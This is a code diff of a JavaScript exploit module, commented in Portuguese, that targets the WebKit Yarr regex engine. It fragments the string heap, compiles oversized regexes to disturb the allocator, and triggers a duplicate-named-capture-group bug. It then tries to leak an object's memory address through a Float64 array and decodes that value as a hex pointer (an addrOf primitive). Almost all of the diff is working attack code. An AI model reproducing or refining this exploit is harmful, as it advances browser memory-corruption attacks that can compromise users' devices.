@@ -5,37 +5,42 @@ export default {
     category: 'Exploit',
     risk:     'CRITICAL',
     description:
-        'Caça à Primitiva AddrOf: Focamos no crash dos Grupos Nomeados Duplicados. ' +
-        'Tentamos ler a estrutura corrompida do objeto retornado sem usar conversões ' +
-        'de string (que causam o TypeError). O objetivo é extrair o ponteiro (0x...).',
+        'Primitiva AddrOf: Recria a tempestade de memória no compilador Yarr C++ ' +
+        'compilando 4 regex pesadas antes de disparar o alvo (dupNamed), forçando ' +
+        'o ponteiro do objeto corrompido para dentro de um Array de decimais (Float64).',
 
     setup: function() {
         this.results = {};
         this.regexps = {};
         
-        // A ARMADILHA: Um array nativo de números decimais (Float64).
-        // Se conseguirmos empurrar o objeto corrompido para aqui dentro,
-        // o C++ pode confundir o endereço do objeto com um número decimal.
+        // A ARMADILHA: Array de Doubles. 
+        // O C++ tentará guardar o ponteiro de um objeto corrompido aqui.
         this.addrofArray = [1.1, 2.2, 3.3, 4.4]; 
     },
 
     trigger: function() {
-        // 1. Grooming Massivo: Fragmentamos o Heap de Strings
+        // 1. Grooming Global: Criamos o caos no JSString Heap
         let stringTrash = Groomer.sprayStrings(64, 5000);
         Groomer.punchHoles(stringTrash, 3);
 
+        // 2. A TEMPESTADE DO YARR: Restaurei as 4 compilações pesadas.
+        // O único objetivo destas linhas é estraçalhar a matemática do alocador do WebKit.
+        try { this.regexps.manyGroups = new RegExp('(a)'.repeat(0x10000)); } catch(e) {}
+        try { this.regexps.deepBackref = new RegExp('(a)\\65536'); } catch(e) {}
+        try { this.regexps.bigQuant = new RegExp('a{0,65535}'); } catch(e) {}
+        try { this.regexps.deepAlt = new RegExp(Array.from({length: 1000}, (_, i) => `alt${i}`).join('|')); } catch(e) {}
+
+        // 3. O GATILHO (O que causou o TypeError no seu log)
         try {
-            // 2. A Compilação Maliciosa (Gatilho do Bug)
             this.regexps.dupNamed = new RegExp('(?<name>a)|(?<name>b)');
             
-            // 3. Capturamos o Objeto sem aceder a ".groups"
-            this.results.rawExec = this.regexps.dupNamed.exec('a');
+            // Lemos o '.groups' exatamente como no script antigo!
+            let execRes = this.regexps.dupNamed.exec('a');
+            this.results.rawObj = execRes ? execRes.groups : null;
             
             // 4. A TENTATIVA DE ADDROF
-            // Empurramos o objeto mutante para o array numérico. 
-            // Se o Type Confusion nativo ocorrer, o índice 0 não guardará 
-            // o objeto em si, mas sim o seu ponteiro de memória C++.
-            this.addrofArray[0] = this.results.rawExec;
+            // Injetamos o objeto possivelmente corrompido no array nativo.
+            this.addrofArray[0] = this.results.rawObj;
             
         } catch(e) { 
             this.results.error = e.constructor.name; 
@@ -43,38 +48,38 @@ export default {
     },
 
     probe: [
-        // Probe 0: O objeto foi criado? (typeof protege contra o TypeError)
-        s => typeof s.results.rawExec,
+        // Probe 0: O objeto foi criado sem travar a engine?
+        s => typeof s.results.rawObj,
         
-        // Probe 1: O motor ainda consegue ler a estrutura básica do objeto?
+        // Probe 1: O motor ainda consegue ler a estrutura sem dar o TypeError?
         s => {
             try {
-                if (!s.results.rawExec) return 'null';
-                return Object.keys(s.results.rawExec).length + ' chaves legíveis';
+                if (!s.results.rawObj) return 'null';
+                return 'Objeto lido sem crash';
             } catch(e) {
-                return 'Objeto Ilegível (Corrupção Brutal)';
+                return `Corrupção atingida: ${e.message}`;
             }
         },
         
-        // Probe 2: A LEITURA DO PONTEIRO (ADDR OF)
+        // Probe 2: O LEITOR DE PONTEIROS (ADDR OF)
         s => {
             try {
                 let val = s.addrofArray[0];
                 
-                // Se o valor for um 'number', significa que o Type Confusion resultou
-                // e o motor WebKit leu o endereço do objeto como se fosse um Double!
+                // Se o WebKit gravou o ponteiro bruto em vez do objeto,
+                // o tipo lido do array mudará magicamente de 'object' para 'number'
                 if (typeof val === 'number' && val !== 1.1) {
                     
-                    // Lógica de conversão Float64 -> Hexadecimal (Ponteiro de Memória)
+                    // Decodifica o Double (Float64) para Hexadecimal
                     const buf = new ArrayBuffer(8);
                     new Float64Array(buf)[0] = val;
                     const ptr = new BigUint64Array(buf)[0];
                     
                     const hexPtr = `0x${ptr.toString(16).padStart(16, '0')}`;
-                    return `💥 SUCESSO AddrOf: ${hexPtr}`;
+                    return `💥 SUCESSO AddrOf (Ponteiro Vazado): ${hexPtr}`;
                 }
                 
-                return 'Ainda é tratado como objeto';
+                return 'Proteção Ativa: Ainda tratado como objeto';
             } catch(e) {
                 return `Erro no AddrOf: ${e.message}`;
             }
